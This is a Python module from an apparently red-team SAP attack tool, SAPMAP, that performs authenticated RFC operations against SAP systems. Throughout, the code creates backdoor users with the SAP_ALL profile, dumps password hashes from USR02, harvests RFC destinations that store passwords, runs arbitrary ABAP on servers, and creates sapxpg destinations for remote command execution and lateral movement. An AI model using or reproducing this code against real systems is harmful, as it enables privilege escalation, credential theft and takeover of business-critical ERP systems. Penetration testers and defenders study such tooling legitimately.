#!/usr/bin/env python3
"""
SAPMAP RFC Operations — Authenticated RFC calls to SAP systems.

Uses sap_rfc_ctypes.RFCConnection for all authenticated operations:
  - Retrieve Type-3 RFC connections (via RSRFCCHK execution)
  - Test RFC connections (/SDF/RFC_CHECK)
  - User management (BAPI_USER_GET_DETAIL, BAPI_USER_CREATE1, etc.)
  - Table reads (RFC_READ_TABLE, CNV_MBT_SHELL_GET_CLIENTS)
  - Password hash download (USR02)
  - Client role detection (T000 CCCATEGORY)
  - TCP/IP destination creation (DEST_RFC_TCPIP_CREATE)
"""

import logging
import time
from datetime import datetime
from typing import Optional

from sapmap_models import (
    SAPNode, RFCConnection as RFCConn, Credentials, CreatedUser, Severity, Finding,
)
from sapmap_config import (
    SAPMAP_USER_PREFIX, SAPMAP_USER_MAX, SAPMAP_PASSWORD_ABAP,
    RFC_CHECK_FM, RFC_CHECK_PARAMS, RFC_LOGON_SUCCESS_TEXT,
    BAPI_USER_CREATE, BAPI_USER_DELETE, BAPI_USER_GET_DETAIL,
    BAPI_USER_PROFILES_ASSIGN, DEST_RFC_TCPIP_CREATE,
    RFC_READ_TABLE, CNV_MBT_SHELL_GET_CLIENTS,
    RSRFCCHK_PROGRAM, RSRFCCHK_JOB_NAME, RSRFCCHK_EXTERNAL_USER,
    DEFAULT_POLL_INTERVAL, DEFAULT_MAX_POLL_ATTEMPTS,
    sapmap_username,
)

logger = logging.getLogger(__name__)

# SDK path (set globally or per-connection)
_sdk_path = None


def set_sdk_path(path: str):
    """Set the NW RFC SDK library path globally."""
    global _sdk_path
    _sdk_path = path


def _get_connection(node: SAPNode, creds: Credentials = None):
    """Create an RFC connection to a node using credentials.

    Returns an sap_rfc_ctypes.RFCConnection (context manager).
    """
    from sap_rfc_ctypes import RFCConnection

    if creds is None:
        creds = node.best_credentials()
    if creds is None:
        raise ValueError(f"No credentials available for {node.sid}")

    host = node.ip or node.hostname
    params = {
        "ashost": host,
        "sysnr": creds.instance_nr,
        "client": creds.client,
        "user": creds.username,
        "passwd": creds.password,
        "lang": "EN",
    }

    return RFCConnection(sdk_path=_sdk_path, **params)


# ---------------------------------------------------------------------------
# Test connection
# ---------------------------------------------------------------------------

def test_connection(node: SAPNode, creds: Credentials = None) -> bool:
    """Test if credentials work by opening a connection and pinging."""
    try:
        with _get_connection(node, creds) as conn:
            ok = conn.ping()
            if ok and creds:
                creds.verified = True
                print(f"[+] Connection test OK for {node.sid} "
                      f"(user={creds.username}, client={creds.client}, "
                      f"inst={creds.instance_nr})")
            return ok
    except Exception as e:
        err = str(e)
        print(f"[-] Connection test failed for {node.sid}: {err}")
        if "password" in err.lower() or "logon" in err.lower():
            print(f"    Check username/password and client number")
        elif "communication" in err.lower() or "connect" in err.lower():
            print(f"    Check host/instance number — cannot reach the system")
        elif "library" in err.lower() or "sdk" in err.lower() or "load" in err.lower():
            print(f"    SAP NW RFC SDK not found — set the SDK path in settings")
        return False


# ---------------------------------------------------------------------------
# User existence check
# ---------------------------------------------------------------------------

def check_user_exists(node: SAPNode, username: str,
                      creds: Credentials = None) -> bool:
    """Check if a user exists in the remote system via BAPI_USER_GET_DETAIL."""
    try:
        with _get_connection(node, creds) as conn:
            result = conn.call(BAPI_USER_GET_DETAIL, USERNAME=username)
            ret = result.get("RETURN", {})
            if isinstance(ret, list):
                # Some systems return a table
                for entry in ret:
                    if entry.get("TYPE", "") in ("E", "A"):
                        msg = entry.get("MESSAGE", "")
                        if "does not exist" in msg.lower():
                            return False
                return True
            else:
                if ret.get("TYPE", "") in ("E", "A"):
                    msg = ret.get("MESSAGE", "")
                    if "does not exist" in msg.lower():
                        return False
                return True
    except Exception as e:
        logger.debug(f"User check failed for {username}@{node.sid}: {e}")
        return False


def next_sapmap_username(node: SAPNode, creds: Credentials = None) -> Optional[str]:
    """Find the next available SAPMAP username (SAPMAP00..99)."""
    for i in range(SAPMAP_USER_MAX + 1):
        username = sapmap_username(i)
        if not check_user_exists(node, username, creds):
            return username
    return None


# ---------------------------------------------------------------------------
# User details retrieval
# ---------------------------------------------------------------------------

def get_user_details(node: SAPNode, username: str,
                     creds: Credentials = None) -> dict:
    """Get user profiles and roles via BAPI_USER_GET_DETAIL.

    Returns dict with:
        - profiles: list of profile names
        - roles: list of role (activity group) names
        - has_sap_all: bool
        - error: str if call failed
    """
    result_info = {
        "profiles": [],
        "roles": [],
        "has_sap_all": False,
        "error": "",
        "raw": {},
    }

    try:
        with _get_connection(node, creds) as conn:
            result = conn.call(BAPI_USER_GET_DETAIL, USERNAME=username)
            result_info["raw"] = result

            # Extract profiles
            profiles_table = result.get("PROFILES", [])
            if isinstance(profiles_table, list):
                for row in profiles_table:
                    pname = row.get("BAPIPROF", "") or row.get("PROFILE", "")
                    if pname:
                        result_info["profiles"].append(pname.strip())

            # Extract activity groups (roles)
            roles_table = result.get("ACTIVITYGROUPS", [])
            if isinstance(roles_table, list):
                for row in roles_table:
                    rname = row.get("AGR_NAME", "") or row.get("ROLE", "")
                    if rname:
                        result_info["roles"].append(rname.strip())

            # Check for SAP_ALL
            result_info["has_sap_all"] = "SAP_ALL" in result_info["profiles"]

    except Exception as e:
        error_msg = str(e)
        if "authorization" in error_msg.lower() or "AUTHORIZATION" in error_msg:
            result_info["error"] = "No authorization for BAPI_USER_GET_DETAIL"
        else:
            result_info["error"] = error_msg
        logger.debug(f"User detail retrieval failed for {username}@{node.sid}: {e}")

    return result_info


def _abap_install_and_run(conn, destination: str, username: str) -> dict:
    """Execute BAPI_USER_GET_DETAIL on a remote system via ABAP_INSTALL_AND_RUN.

    Dynamically generates an ABAP program that calls BAPI_USER_GET_DETAIL
    with DESTINATION '<dest>' to retrieve user profiles on the TARGET system.
    The program is compiled and executed on the SOURCE system.

    Tries RFC_ABAP_INSTALL_AND_RUN first, then /SAPDS/RFC_ABAP_INSTALL_RUN
    (available on newer S/4HANA systems).

    Returns dict with: profiles, has_sap_all, error.
    """
    # Build ABAP source lines
    abap_lines = [
        "REPORT zsapmap.",
        "DATA: t_profiles TYPE TABLE OF bapiprof,",
        "      l_profiles LIKE LINE OF t_profiles,",
        "      t_roles    TYPE TABLE OF bapiagr.",
        f"CALL FUNCTION 'BAPI_USER_GET_DETAIL' DESTINATION '{destination}'",
        "  EXPORTING",
        f"    username       = '{username}'",
        "  TABLES",
        "    profiles       = t_profiles",
        "    activitygroups = t_roles.",
        "LOOP AT t_profiles INTO l_profiles.",
        "  WRITE: / l_profiles-bapiprof.",
        "ENDLOOP.",
    ]
    program_table = [{"LINE": line} for line in abap_lines]

    # Determine which FM is available via FUNCTION_EXISTS
    fm_name = None
    for candidate in ("RFC_ABAP_INSTALL_AND_RUN", "/SAPDS/RFC_ABAP_INSTALL_RUN"):
        try:
            fe_result = conn.call("FUNCTION_EXISTS", FUNCNAME=candidate)
            # If no exception, the FM exists
            fm_name = candidate
            break
        except Exception:
            continue
    if not fm_name:
        return {
            "profiles": [],
            "has_sap_all": False,
            "error": "Neither RFC_ABAP_INSTALL_AND_RUN nor /SAPDS/RFC_ABAP_INSTALL_RUN available",
        }

    try:
        result = conn.call(
            fm_name,
            PROGRAMNAME="ZSAPMAP",
            MODE="F",
            PROGRAM=program_table,
        )
        # Parse WRITES table — each row contains a profile name
        writes = result.get("WRITES", [])
        profiles = []
        for row in writes:
            line = ""
            if isinstance(row, dict):
                # WRITES structure field is ZEILE
                line = (row.get("ZEILE", "") or
                        row.get("ZEESSION", "") or
                        row.get("LINE", "") or
                        row.get("WA", "")).strip()
            elif isinstance(row, str):
                line = row.strip()
            if line:
                profiles.append(line)
        return {
            "profiles": profiles,
            "has_sap_all": "SAP_ALL" in profiles,
            "error": "",
        }
    except Exception as e:
        return {
            "profiles": [],
            "has_sap_all": False,
            "error": f"{fm_name} failed: {e}",
        }


def get_remote_user_profiles(node: SAPNode, username: str,
                             destination: str,
                             creds: Credentials = None) -> dict:
    """Get user profiles on a REMOTE system via ABAP_INSTALL_AND_RUN.

    Generates an ABAP program that calls BAPI_USER_GET_DETAIL with
    DESTINATION '<dest>' on the source system, which executes the BAPI
    on the target system and returns the profiles.

    Tries RFC_ABAP_INSTALL_AND_RUN first, then /SAPDS/RFC_ABAP_INSTALL_RUN.

    Returns dict with: profiles, has_sap_all, error.
    """
    result_info = {"profiles": [], "has_sap_all": False, "error": ""}

    try:
        with _get_connection(node, creds) as conn:
            result_info = _abap_install_and_run(conn, destination, username)

            if result_info["profiles"]:
                print(f"[+] Remote profiles for {username} via {destination}: "
                      f"{', '.join(result_info['profiles'])}")
            elif result_info["error"]:
                print(f"[-] Could not get profiles for {username} via "
                      f"{destination}: {result_info['error']}")
            else:
                print(f"[*] No profiles found for {username} via {destination}")

    except Exception as e:
        result_info["error"] = str(e)
        logger.debug(f"Remote user detail retrieval failed: {e}")

    return result_info


# ---------------------------------------------------------------------------
# Create user via BAPI
# ---------------------------------------------------------------------------

def create_user_via_bapi(node: SAPNode, username: str, password: str,
                         client: str, creds: Credentials = None) -> dict:
    """Create a user with SAP_ALL via BAPI_USER_CREATE1 + BAPI_USER_PROFILES_ASSIGN.

    Returns dict with: success, message, username
    """
    result = {"success": False, "message": "", "username": username}

    try:
        with _get_connection(node, creds) as conn:
            # Step 1: Create the user
            create_result = conn.call(
                BAPI_USER_CREATE,
                USERNAME=username,
                PASSWORD={"BAPIPWD": password},
                LOGONDATA={
                    "USTYP": "S",      # System/service user
                    "GLTGB": "99991231",  # Valid to (far future)
                },
                ADDRESS={
                    "FIRSTNAME": "SAPMAP",
                    "LASTNAME": "Security",
                    "FUNCTION": "SAPMAP Red Team",
                },
            )

            ret = create_result.get("RETURN", {})
            if isinstance(ret, list):
                for entry in ret:
                    if entry.get("TYPE", "") in ("E", "A"):
                        result["message"] = entry.get("MESSAGE", "Unknown error")
                        print(f"[-] User creation failed: {result['message']}")
                        return result
            elif ret.get("TYPE", "") in ("E", "A"):
                result["message"] = ret.get("MESSAGE", "Unknown error")
                print(f"[-] User creation failed: {result['message']}")
                return result

            print(f"[+] User {username} created in {node.sid} client {client}")

            # Step 2: Assign SAP_ALL profile
            try:
                assign_result = conn.call(
                    BAPI_USER_PROFILES_ASSIGN,
                    USERNAME=username,
                    PROFILES=[{"BAPIPROF": "SAP_ALL"}, {"BAPIPROF": "SAP_NEW"}],
                )
                ret = assign_result.get("RETURN", {})
                if isinstance(ret, list):
                    for entry in ret:
                        if entry.get("TYPE", "") in ("E", "A"):
                            print(f"[!] SAP_ALL assignment warning: {entry.get('MESSAGE', '')}")
                elif ret.get("TYPE", "") in ("E", "A"):
                    print(f"[!] SAP_ALL assignment warning: {ret.get('MESSAGE', '')}")
                else:
                    print(f"[+] SAP_ALL profile assigned to {username}")
            except Exception as e:
                print(f"[!] Could not assign SAP_ALL: {e}")

            result["success"] = True
            result["message"] = f"User {username} created with SAP_ALL"

    except Exception as e:
        result["message"] = str(e)
        logger.error(f"BAPI user creation failed: {e}")
        print(f"[-] User creation error: {e}")

    return result


# ---------------------------------------------------------------------------
# Delete user via BAPI
# ---------------------------------------------------------------------------

def delete_user(node: SAPNode, username: str,
                creds: Credentials = None) -> bool:
    """Delete a user via BAPI_USER_DELETE."""
    try:
        with _get_connection(node, creds) as conn:
            result = conn.call(BAPI_USER_DELETE, USERNAME=username)
            ret = result.get("RETURN", {})
            if isinstance(ret, list):
                for entry in ret:
                    if entry.get("TYPE", "") in ("E", "A"):
                        print(f"[-] Delete failed: {entry.get('MESSAGE', '')}")
                        return False
            elif ret.get("TYPE", "") in ("E", "A"):
                print(f"[-] Delete failed: {ret.get('MESSAGE', '')}")
                return False
            print(f"[+] User {username} deleted from {node.sid}")
            return True
    except Exception as e:
        logger.error(f"User deletion failed for {username}@{node.sid}: {e}")
        print(f"[-] Delete error: {e}")
        return False


# ---------------------------------------------------------------------------
# RFC connection testing (/SDF/RFC_CHECK)
# ---------------------------------------------------------------------------

def test_rfc_destination(node: SAPNode, destination_name: str,
                         creds: Credentials = None,
                         rfc_check_cache: dict = None) -> dict:
    """Test an RFC destination via /SDF/RFC_CHECK.

    Returns dict with: logon_ok, ping_ok, latency_ms, logon_message, error
    """
    # Check cache first
    if rfc_check_cache and destination_name in rfc_check_cache:
        return rfc_check_cache[destination_name]

    result = {
        "logon_ok": False,
        "ping_ok": False,
        "latency_ms": 0,
        "logon_message": "",
        "error": "",
    }

    try:
        with _get_connection(node, creds) as conn:
            check_result = conn.call(
                RFC_CHECK_FM,
                IV_DESTINATION=destination_name,
                **RFC_CHECK_PARAMS,
            )

            result["logon_message"] = check_result.get("EV_LOGON_MESSAGE", "").strip()
            result["ping_ok"] = check_result.get("EV_PING_MESSAGE", "").strip() != ""
            result["ping_status"] = str(check_result.get("EV_PING_STATUS", "")).strip()
            # EV_LOGON_STATUS=1 means logon succeeded; fall back to text match
            logon_status = check_result.get("EV_LOGON_STATUS", "")
            if str(logon_status).strip() == "1":
                result["logon_ok"] = True
            else:
                result["logon_ok"] = RFC_LOGON_SUCCESS_TEXT in result["logon_message"]

            # Read latency — prefer numeric EV_LATENCY_IN_MS, fall back to message
            lat_ms = check_result.get("EV_LATENCY_IN_MS", 0)
            if isinstance(lat_ms, int) and lat_ms > 0:
                result["latency_ms"] = lat_ms
            else:
                latency_msg = check_result.get("EV_LATENCY_MESSAGE", "")
                if latency_msg:
                    try:
                        import re
                        match = re.search(r'(\d+)', latency_msg)
                        if match:
                            result["latency_ms"] = int(match.group(1))
                    except Exception:
                        pass

    except Exception as e:
        result["error"] = str(e)
        logger.debug(f"RFC check failed for {destination_name}@{node.sid}: {e}")

    # Cache the result
    if rfc_check_cache is not None:
        rfc_check_cache[destination_name] = result

    return result


# ---------------------------------------------------------------------------
# Retrieve RFC connections (via RSRFCCHK)
# ---------------------------------------------------------------------------

def retrieve_rfc_connections(node: SAPNode, creds: Credentials = None) -> list:
    """Retrieve Type-3 RFC connections from a system by executing RSRFCCHK.

    Uses the XBP job scheduling approach from poc_remote_abap_exec.py.
    Returns list of RFCConn objects.
    """
    connections = []

    try:
        with _get_connection(node, creds) as conn:
            # Step 1: XMI Logon
            print(f"[*] Logging on to XBP interface on {node.sid}...")
            xmi_result = conn.call(
                "BAPI_XMI_LOGON",
                EXTCOMPANY="SAPMAP",
                EXTPRODUCT="SAPMAP",
                INTERFACE="XBP",
                VERSION="3.0",
            )
            ret = xmi_result.get("RETURN", {})
            if isinstance(ret, dict) and ret.get("TYPE", "") in ("E", "A"):
                print(f"[-] XBP logon failed: {ret.get('MESSAGE', '')}")
                return _try_rfc_read_table_fallback(conn, node)

            # Step 2: Open job
            print(f"[*] Scheduling RSRFCCHK job on {node.sid}...")
            job_result = conn.call(
                "BAPI_XBP_JOB_OPEN",
                JOBNAME=RSRFCCHK_JOB_NAME,
                EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
            )
            jobcount = job_result.get("JOBCOUNT", "")
            if not jobcount:
                print(f"[-] Failed to open job: {job_result}")
                return _try_rfc_read_table_fallback(conn, node)

            # Step 3: Add ABAP step
            conn.call(
                "BAPI_XBP_JOB_ADD_ABAP_STEP",
                JOBNAME=RSRFCCHK_JOB_NAME,
                JOBCOUNT=jobcount,
                EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
                ABAP_PROGRAM_NAME=RSRFCCHK_PROGRAM,
            )

            # Step 4: Close job
            conn.call(
                "BAPI_XBP_JOB_CLOSE",
                JOBNAME=RSRFCCHK_JOB_NAME,
                JOBCOUNT=jobcount,
                EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
            )

            # Step 5: Start job
            conn.call(
                "BAPI_XBP_JOB_START_IMMEDIATELY",
                JOBNAME=RSRFCCHK_JOB_NAME,
                JOBCOUNT=jobcount,
                EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
            )
            print(f"[*] Job started, polling for completion...")

            # Step 6: Wait for completion
            finished = False
            for attempt in range(DEFAULT_MAX_POLL_ATTEMPTS):
                status_result = conn.call(
                    "BAPI_XBP_JOB_STATUS_GET",
                    JOBNAME=RSRFCCHK_JOB_NAME,
                    JOBCOUNT=jobcount,
                    EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
                )
                status = status_result.get("STATUS", "?")
                if status == "F":
                    finished = True
                    break
                if status == "X":
                    print(f"[-] Job aborted")
                    break
                time.sleep(DEFAULT_POLL_INTERVAL)

            if not finished:
                print(f"[-] Job did not finish, trying table fallback...")
                return _try_rfc_read_table_fallback(conn, node)

            # Step 7: Read spool output
            print(f"[+] Job finished, reading spool output...")
            try:
                spool_result = conn.call(
                    "BAPI_XBP_JOB_SPOOLLIST_READ",
                    JOBNAME=RSRFCCHK_JOB_NAME,
                    JOBCOUNT=jobcount,
                    STEP_NUMBER=1,
                    EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
                )
                spool_lines = spool_result.get("SPOOL_LIST", [])
                if spool_lines:
                    connections = _parse_rsrfcchk_output(spool_lines, node)
                    print(f"[+] Parsed {len(connections)} RFC connections from spool")
                else:
                    print(f"[*] No spool output, trying table fallback...")
                    connections = _try_rfc_read_table_fallback(conn, node)
            except Exception as e:
                logger.debug(f"Spool read error: {e}")
                connections = _try_rfc_read_table_fallback(conn, node)

            # XMI Logoff
            try:
                conn.call("BAPI_XMI_LOGOFF", INTERFACE="XBP")
            except Exception:
                pass

            # If RSRFCCHK yielded nothing, fall back to RFCDES table
            if not connections:
                print(f"[*] No connections from RSRFCCHK, trying RFCDES fallback...")
                connections = _try_rfc_read_table_fallback(conn, node)

    except Exception as e:
        logger.error(f"RFC connection retrieval failed for {node.sid}: {e}")
        print(f"[-] Failed to retrieve RFC connections: {e}")
        # Last resort: try RFCDES in a fresh connection
        try:
            with _get_connection(node, creds) as conn:
                connections = _try_rfc_read_table_fallback(conn, node)
        except Exception as e2:
            logger.debug(f"RFCDES fallback also failed: {e2}")

    return connections


def _parse_rsrfcchk_output(spool_lines: list, node: SAPNode) -> list:
    """Parse RSRFCCHK spool output into RFCConn objects."""
    connections = []

    for line in spool_lines:
        text = line.get("LINE", "") or line.get("WA", "") or str(line)
        # RSRFCCHK output format varies but typically contains:
        # Destination name, host, instance, client, user, connection type
        # Parse heuristically
        text = text.strip()
        if not text or text.startswith("*") or text.startswith("-"):
            continue

        # Try to extract type-3 connection info
        # Format typically: DESTNAME | HOST | INST | CLIENT | USER | TYPE
        parts = [p.strip() for p in text.split("|")]
        if len(parts) >= 4:
            dest_name = parts[0] if len(parts) > 0 else ""
            target_host = parts[1] if len(parts) > 1 else ""
            inst_nr = parts[2] if len(parts) > 2 else ""
            rfc_user = parts[3] if len(parts) > 3 else ""
            client = parts[4] if len(parts) > 4 else ""

            if dest_name:
                conn = RFCConn(
                    source_sid=node.sid,
                    source_host=node.hostname or node.ip,
                    target_host=target_host,
                    target_instance_nr=inst_nr,
                    destination_name=dest_name,
                    rfc_user=rfc_user,
                    client=client,
                )
                connections.append(conn)

    return connections


def _try_rfc_read_table_fallback(conn, node: SAPNode) -> list:
    """Fallback: read RFCDES table directly for Type-3 connections with stored passwords."""
    print(f"[*] Trying RFC_READ_TABLE fallback on RFCDES...")
    connections = []

    try:
        result = conn.call(
            RFC_READ_TABLE,
            QUERY_TABLE="RFCDES",
            DELIMITER="|",
            FIELDS=[
                {"FIELDNAME": "RFCDEST"},
                {"FIELDNAME": "RFCTYPE"},
                {"FIELDNAME": "RFCOPTIONS"},
            ],
            OPTIONS=[{"TEXT": "RFCTYPE = '3'"}],
            ROWCOUNT=500,
        )

        data = result.get("DATA", [])
        for row in data:
            wa = row.get("WA", "")
            parts = wa.split("|")
            if len(parts) >= 2:
                dest_name = parts[0].strip()
                options = parts[2].strip() if len(parts) > 2 else ""

                # Only include connections that have a stored password
                if "%_PWD" not in options:
                    continue

                conn_obj = RFCConn(
                    source_sid=node.sid,
                    source_host=node.hostname or node.ip,
                    destination_name=dest_name,
                )
                _parse_rfcdes_options(conn_obj, options)
                connections.append(conn_obj)

        print(f"[+] Found {len(connections)} Type-3 connections "
              f"with stored passwords via RFCDES")

    except Exception as e:
        logger.debug(f"RFCDES read failed: {e}")
        print(f"[-] Could not read RFCDES table: {e}")

    return connections


def _parse_rfcdes_options(conn: RFCConn, options_str: str):
    """Parse RFCDES RFCOPTIONS field to extract host, instance, user, client."""
    for part in options_str.split(","):
        part = part.strip()
        if part.startswith("H="):
            conn.target_host = part[2:].strip()
        elif part.startswith("S="):
            conn.target_instance_nr = part[2:].strip()
        elif part.startswith("U="):
            conn.rfc_user = part[2:].strip()
        elif part.startswith("M="):
            conn.client = part[2:].strip()


# ---------------------------------------------------------------------------
# Read table data
# ---------------------------------------------------------------------------

def read_table(node: SAPNode, table_name: str, fields: list = None,
               where: str = "", max_rows: int = 500,
               creds: Credentials = None) -> list:
    """Read data from an SAP table via RFC_READ_TABLE.

    Args:
        table_name: SAP table name (e.g., "USR02", "T000")
        fields: list of field names to retrieve
        where: WHERE clause (e.g., "BNAME = 'DDIC'")
        max_rows: maximum rows to return

    Returns:
        list of dicts with field values
    """
    rows = []

    try:
        with _get_connection(node, creds) as conn:
            params = {
                "QUERY_TABLE": table_name,
                "DELIMITER": "|",
                "ROWCOUNT": max_rows,
            }
            if fields:
                params["FIELDS"] = [{"FIELDNAME": f} for f in fields]
            if where:
                # Split WHERE into 72-char chunks (SAP table parameter limit)
                options = []
                while where:
                    chunk = where[:72]
                    options.append({"TEXT": chunk})
                    where = where[72:]
                params["OPTIONS"] = options

            result = conn.call(RFC_READ_TABLE, **params)

            # Parse field metadata
            field_meta = result.get("FIELDS", [])
            field_names = [f.get("FIELDNAME", "").strip() for f in field_meta]
            field_offsets = [(int(f.get("OFFSET", 0)), int(f.get("LENGTH", 0)))
                            for f in field_meta]

            # Parse data rows
            data = result.get("DATA", [])
            for row in data:
                wa = row.get("WA", "")
                parts = wa.split("|")
                row_dict = {}
                for i, fname in enumerate(field_names):
                    if i < len(parts):
                        row_dict[fname] = parts[i].strip()
                    else:
                        row_dict[fname] = ""
                rows.append(row_dict)

    except Exception as e:
        logger.error(f"Table read failed for {table_name}@{node.sid}: {e}")
        print(f"[-] Could not read {table_name}: {e}")

    return rows


# ---------------------------------------------------------------------------
# Download password hashes
# ---------------------------------------------------------------------------

def download_password_hashes(node: SAPNode,
                             creds: Credentials = None) -> list:
    """Download password hashes from USR02 table.

    Returns list of dicts: {BNAME, BCODE, PASSCODE, CODVN, USTYP, MANDT}
    """
    print(f"[*] Downloading password hashes from {node.sid}...")
    fields = ["MANDT", "BNAME", "BCODE", "PASSCODE", "CODVN", "USTYP", "UFLAG"]
    rows = read_table(node, "USR02", fields=fields, creds=creds, max_rows=9999)
    if rows:
        print(f"[+] Downloaded {len(rows)} password hashes from {node.sid}")
    else:
        print(f"[-] No password hashes retrieved from {node.sid}")
    return rows


# ---------------------------------------------------------------------------
# Client role detection
# ---------------------------------------------------------------------------

def get_client_roles(node: SAPNode, creds: Credentials = None) -> list:
    """Read T000 table to get client categories (P=Production, etc.).

    Returns list of dicts: {MANDT, CCCATEGORY, CCCORACTIV, MTEXT}
    """
    # Try CNV_MBT_SHELL_GET_CLIENTS first (S/4 systems)
    clients = []
    try:
        with _get_connection(node, creds) as conn:
            try:
                result = conn.call(CNV_MBT_SHELL_GET_CLIENTS)
                client_list = result.get("ET_CLIENTS", [])
                for c in client_list:
                    clients.append({
                        "MANDT": c.get("MANDT", "") or c.get("CLIENT", ""),
                        "CCCATEGORY": c.get("CCCATEGORY", ""),
                    })
                if clients:
                    return clients
            except Exception:
                pass  # Fall through to RFC_READ_TABLE

            # Fallback: RFC_READ_TABLE on T000
            result = conn.call(
                RFC_READ_TABLE,
                QUERY_TABLE="T000",
                DELIMITER="|",
                FIELDS=[
                    {"FIELDNAME": "MANDT"},
                    {"FIELDNAME": "CCCATEGORY"},
                    {"FIELDNAME": "MTEXT"},
                ],
            )
            data = result.get("DATA", [])
            for row in data:
                parts = row.get("WA", "").split("|")
                if len(parts) >= 2:
                    clients.append({
                        "MANDT": parts[0].strip(),
                        "CCCATEGORY": parts[1].strip(),
                        "MTEXT": parts[2].strip() if len(parts) > 2 else "",
                    })

    except Exception as e:
        logger.debug(f"Client role read failed for {node.sid}: {e}")
        print(f"[-] Could not read client roles: {e}")

    return clients


def update_node_production_status(node: SAPNode, creds: Credentials = None):
    """Check client roles and update node's production status + clients list."""
    client_roles = get_client_roles(node, creds)
    if client_roles:
        node.clients = [
            {"nr": c["MANDT"], "category": c.get("CCCATEGORY", "")}
            for c in client_roles
        ]
        node.is_production = any(
            c.get("CCCATEGORY", "").upper() == "P" for c in client_roles
        )
        if node.is_production:
            print(f"[!] {node.sid} has PRODUCTION client(s)")
        else:
            print(f"[*] {node.sid} has no production clients")


# ---------------------------------------------------------------------------
# TCP/IP destination creation (sapxpg remote test)
# ---------------------------------------------------------------------------

def create_tcpip_destination(node: SAPNode, target_host: str,
                             target_sid: str = "",
                             target_gw_port: str = "",
                             creds: Credentials = None) -> dict:
    """Create a TCP/IP destination for remote sapxpg execution.

    Args:
        node: source SAP system to create the destination on
        target_host: IP/hostname of the target system
        target_sid: SID of the target (used in dest name)
        target_gw_port: gateway port of the target (e.g. "3300")
        creds: credentials to use on the source system

    Returns dict with: success, message, dest_name
    """
    ts = datetime.now().strftime("%Y%m%d%H%M%S")
    dest_name = f"SAPMAP_{target_sid}_{ts}" if target_sid else f"SAPMAP_{target_host[:14]}_{ts}"
    gw_service = target_gw_port or "3300"

    result = {"success": False, "message": "", "dest_name": dest_name}

    try:
        with _get_connection(node, creds) as conn:
            create_result = conn.call(
                DEST_RFC_TCPIP_CREATE,
                NAME=dest_name,
                DESCRIPTION=f"TCP/IP CONNECTION TO {target_sid or target_host}",
                SERVER_NAME=target_host,
                GATEWAY_HOST=target_host,
                GATEWAY_SERVICE=gw_service,
                METHOD="E",
                PROGRAM="sapxpg",
                CPIC_TIMEOUT="20",
            )
            # Check result
            ret = create_result.get("RETURN", {})
            if isinstance(ret, dict) and ret.get("TYPE", "") in ("E", "A"):
                result["message"] = ret.get("MESSAGE", "Unknown error")
            else:
                result["success"] = True
                result["message"] = f"TCP/IP destination {dest_name} created"
                print(f"[+] Created TCP/IP dest {dest_name} → "
                      f"{target_host} (gw={gw_service})")
    except Exception as e:
        result["message"] = str(e)
        print(f"[-] TCP/IP dest creation error: {e}")
        logger.debug(f"TCP/IP dest creation failed: {e}")

    return result
